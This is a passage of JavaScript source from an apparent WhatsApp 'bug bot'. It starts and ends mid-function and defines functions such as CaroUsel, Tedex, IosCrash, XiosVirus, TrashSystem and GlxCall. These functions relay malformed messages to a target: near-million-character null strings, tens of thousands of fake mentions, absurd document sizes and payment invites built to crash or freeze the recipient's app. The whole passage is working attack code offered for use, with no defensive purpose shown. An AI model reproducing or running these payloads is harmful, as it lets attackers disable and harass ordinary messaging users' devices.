									paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"X-FaxzBug Membantai\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(Amount)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
									version: 3
								}
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.green("Sending Bug By ÂlwaysFaxz🔥"));
		};

		async function CrL(X, Qtd, Txt, Ptcp = true) {
			let etc = generateWAMessageFromContent(X, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: "",
								locationMessage: {},
								hasMediaAttachment: true
							},
							body: {
								text: Txt
							},
							nativeFlowMessage: {
								messageParamsJson: " faxz guarantees all phones :) \n\n\n I know, you tried to copy this bug with m.quoted/m.message, right ? "
							},
							carouselMessage: {}
						}
					}
				}
			}), {
				userJid: X,
				quoted: Qtd
			});

			await TheFaxz.relayMessage(X, etc.message, Ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Sending Bug By ÂlwaysFaxz🔥"));
		};

		async function FxZIvS(X, Ptcp = true) {
			let etc = generateWAMessageFromContent(X, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: "",
								locationMessage: {},
								hasMediaAttachment: true
							},
							body: {
								text: " ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊"
							},
							nativeFlowMessage: {
								name: "call_permission_request",
								messageParamsJson: " zangetsu🔥 "
							},
							carouselMessage: {}
						}
					}
				}
			}), {
				userJid: X,
				quoted: Qrad
			});

			await TheFaxz.relayMessage(X, etc.message, Ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Sending Bug By ÂlwaysFaxz🔥"));
		};

		async function OutOff(X, Ptcp = true) {
			let etc = generateWAMessageFromContent(X, proto.Message.fromObject({
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: " ⟅̊༑ ▾ ⌜ 🔥zangetsu メ 𝐁𝐮𝐠🔥 ⌟ ▾ ༑̴⟆̤̊",
								locationMessage: {},
								hasMediaAttachment: true
							},
							body: {
								text: ""
							},
							nativeFlowMessage: {
								messageParamsJson: " Faxz Company Tagline Here!! \n\n\n You Stupid?? ",
								buttons: [{
									name: "payment_info",
									buttonParamsJson: `{\"currency\":\"IRP\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4P46GMY57GC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"XXX\",\"key\":\"+99999999999\",\"key_type\":\"XXX\"}}]}`
								}],
							},
						}
					}
				}
			}), {
				userJid: X
			});
			await TheFaxz.relayMessage(X, etc.message, Ptcp ? {
				participant: {
					jid: X
				}
			} : {});
		}

		async function CaroUsel(X) {
			await TheFaxz.relayMessage(X, {
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								subtitle: "\u0000".repeat(900000),
								title: "",
								locationMessage: {},
								hasMediaAttachment: true
							},
							body: {
								text: "",
							},
							nativeFlowMessage: {
								messageParamsJson: ""
							},
							carouselMessage: {}
						}
					}
				}
			}, {});
			console.log(chalk.green("Sending Bug By ÂlwaysFaxz🔥"));
		};

		async function Gsz(X, QTD) {
			await TheFaxz.relayMessage(X, {
				viewOnceMessage: {
					message: {
						interactiveMessage: {
							header: {
								title: "",
								locationMessage: {},
								hasMediaAttachment: true
							},
							body: {
								text: "zangetsu🔥" + "\u0000".repeat(900000)
							},
							nativeFlowMessage: {
								messageParamsJson: ""
							},
							carouselMessage: {}
						}
					}
				}
			}, {
				participant: {
					jid: X
				}
			});
			let XS = fs.readFileSync('./all/X-Media/XY.webp')
			await TheFaxz.sendMessage(X, {
				sticker: XS
			}, {
				quoted: QTD
			})
			console.log(chalk.green("Sending Bug By ÂlwaysFaxz🔥"));
		};

		async function Tedex(X, QTD) {
			await TheFaxz.relayMessage(X, {
				'viewOnceMessage': {
					'message': {
						'interactiveMessage': {
							'header': {
								'title': '',
								'locationMessage': {},
								'hasMediaAttachment': true
							},
							'body': {
								'text': 'zangetsu🔥' + '\x00'.repeat(950000)
							},
							'nativeFlowMessage': {
								'messageParamsJson': '\x00'
							},
							'carouselMessage': {}
						}
					}
				}
			}, {
				participant: {
					jid: X
				}
			});
			await TheFaxz.sendMessage(X, {
				text: `zangetsu`
			}, {
				quoted: QTD
			});
			console.log(chalk.green("Sending Bug By ÂlwaysFaxz🔥"));
		};

		async function IosCrash(LockJids) {
			await TheFaxz.relayMessage(LockJids, {
				"paymentInviteMessage": {
					serviceType: "FBPAY",
					expiryTimestamp: Date.now() + 1814400000
				}
			}, {
				participant: {
					jid: LockJids
				}
			})
			console.log(chalk.green("Sending Bug By ÂlwaysFaxz🔥"));
		};

		async function XiosVirus(jid) {
			TheFaxz.relayMessage(jid, {
				'extendedTextMessage': {
					'text': '.',
					'contextInfo': {
						'stanzaId': jid,
						'participant': jid,
						'quotedMessage': {
							'conversation': ' ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊' + 'ꦾ'.repeat(50000)
						},
						'disappearingMode': {
							'initiator': "CHANGED_IN_CHAT",
							'trigger': "CHAT_SETTING"
						}
					},
					'inviteLinkGroupTypeV2': "DEFAULT"
				}
			}, {
				'participant': {
					'jid': jid
				}
			}, {
				'messageId': null
			});
			console.log(chalk.green("Sending Bug By ÂlwaysFaxz🔥"));
		};

		async function XiosPay(jid) {
			TheFaxz.relayMessage(jid, {
				'paymentInviteMessage': {
					'serviceType': "UPI",
					'expiryTimestamp': Date.now() + 86400000
				}
			}, {
				'participant': {
					'jid': jid
				}
			});
			console.log(chalk.green("Sending Bug By ÂlwaysFaxz🔥"));
		};

		async function TrashSystem(X, ThM, Ptcp = true) {
			await TheFaxz.relayMessage(X, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: " ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: ThM,
									},
									hasMediaAttachment: true,
								},
								body: {
									text: " ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊\n" + "@6282311435959".repeat(17000),
								},
								nativeFlowMessage: {
									buttons: [{
											name: "cta_url",
											buttonParamsJson: "{ display_text: ' ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊', url: \"https://youtube.com/@faxz.attacker\", merchant_url: \"https://youtube.com/@faxz.attacker\" }",
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}",
										},
									],
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["6282311435959@s.whatsapp.net", ...Array.from({
										length: 30000
									}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "🔥zangetsu メ MargaAlways🔥",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.green("Sending Bug By ÂlwaysFaxz🔥"));
		};

		async function StuckNull(X, ThM, Ptcp = true) {
			await TheFaxz.relayMessage(X, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: " ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: ThM,
									},
									hasMediaAttachment: true,
								},
								body: {
									text: " ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊\n" + "@6282311435959".repeat(17000),
								},
								nativeFlowMessage: {
									buttons: [{
											name: "cta_url",
											buttonParamsJson: "{ display_text: ' ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊', url: \"https://youtube.com/@faxz.attacker\", merchant_url: \"https://youtube.com/@faxz.attacker\" }",
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}",
										},
									],
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["6282311435959@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "🔥zangetsu メ MargaAlways🔥",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.green("Sending Bug By ÂlwaysFaxz🔥"));
		};

		async function StuckSql(X, ThM, Ptcp = true) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: " ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: ThM,
									},
									hasMediaAttachment: true,
								},
								body: {
									text: " ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊\n" + "@6282311435959".repeat(17000),
								},
								nativeFlowMessage: {
									buttons: [{
											name: "cta_url",
											buttonParamsJson: "{ display_text: ' ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊', url: \"https://youtube.com/@faxz.attacker\", merchant_url: \"https://youtube.com/@faxz.attacker\" }",
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}",
										},
									],
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["6282311435959@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "🔥zangetsu メ MargaAlways🔥",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				}), {
					userJid: X,
					quoted: EsQl
				}
			);
			await TheFaxz.relayMessage(X, etc.message, Ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Sending Bug By ÂlwaysFaxz🔥"));
		};

		async function GlX(X, Ptcp = true) {
			await TheFaxz.relayMessage(X, {
					viewOnceMessage: {
						message: {
							interactiveResponseMessage: {
								body: {
									text: "zangetsu🔥",
									format: "EXTENSIONS_1"
								},
								nativeFlowResponseMessage: {
									name: 'galaxy_message',
									paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\" ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@faxz.attacker\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\" ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊${"\u0000".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
									version: 3
								}
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.green("Sending Bug By ÂlwaysFaxz🔥"));
		};

		async function GlxCall(X, ThM, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: " ⟅̊༑ ▾ ⌜ 🔥zangetsu メ 𝐁𝐮𝐠🔥 ⌟ ▾ ༑̴⟆̤̊",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: "‎zangetsu🔥"
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\"  ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊ \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\" ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\" ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "review_and_pay",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "review_and_pay",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_info",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_info",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\" ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊\",\"sections\":[{\"title\":\" ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"🔥\",\"flow_id\":\"BY ÂlwàysFâxz\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: X,
					quoted: EsQl
				}
			);

			await TheFaxz.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Sending Bug By ÂlwaysFaxz🔥"));
		};

		async function GlxCallX(X, ThM, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: " ⟅̊༑ ▾ ⌜ 🔥zangetsu メ 𝐁𝐮𝐠🔥 ⌟ ▾ ༑̴⟆̤̊",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: "‎ ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊"
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\"  ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊ \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\" ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\" ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "review_and_pay",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "review_and_pay",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_info",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_info",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\" ⟅̊༑ ▾ ⌜ zangetsu メ 𝐁𝐮𝐠 ⌟ ▾ ༑̴⟆̤̊\",\"sections\":[{\"title\":\" ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̊\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"🔥\",\"flow_id\":\"BY ÂlwàysFâxz\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: X,
					quoted: VisiX
				}
			);

			await TheFaxz.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Sending Bug By ÂlwaysFaxz🔥"));
		};

async function FxZxTxOs(X, Ptcp = false) {
			await TheFaxz.relayMessage(X, {
					extendedTextMessage: {
						text: " ⟅̊༑ ▾ ⌜ zangetsu ⌟ ▾ ༑̴⟆̤̤̊\n" + "@6282311435959".repeat(15000),
						contextInfo: {
							mentionedJid: [
								"6282311435959@s.whatsapp.net",
								...Array.from({
									length: 15000
								}, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
							],
							stanzaId: "1234567890ABCDEF",
							participant: "0@s.whatsapp.net",
							quotedMessage: {
								callLogMesssage: {
									isVideo: true,
									callOutcome: "1",
									durationSecs: "0",
									callType: "REGULAR",
									participants: [{
										jid: "0@s.whatsapp.net",
										callOutcome: "1"
									}]
								}
							},
							remoteJid: X,
							conversionSource: " X ",
